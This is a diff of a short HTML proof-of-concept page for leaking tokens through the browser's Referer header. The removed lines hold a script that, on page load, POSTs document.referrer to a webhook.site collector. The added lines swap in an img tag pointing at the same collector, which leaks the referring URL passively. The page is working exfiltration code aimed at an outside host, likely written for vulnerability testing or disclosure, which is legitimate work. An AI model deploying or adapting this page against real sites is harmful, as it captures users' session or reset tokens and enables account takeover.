@@ -1,23 +1,9 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Token Leak PoC</title>
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const ref = document.referrer;
-        const data = "referer=" + encodeURIComponent(ref);
-        
-        fetch("https://webhook.site/d8f4e5e6-1316-4705-aef3-6180216d686a", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: data
-        });
-      });
-    </script>
+    <title>PoC: Token Leak via Referer</title>
   </head>
   <body>
-    <h1>Testing Token Leak...</h1>
+    <img src="https://webhook.site/d8f4e5e6-1316-4705-aef3-6180216d686a/image.png" alt="." />
   </body>
 </html>
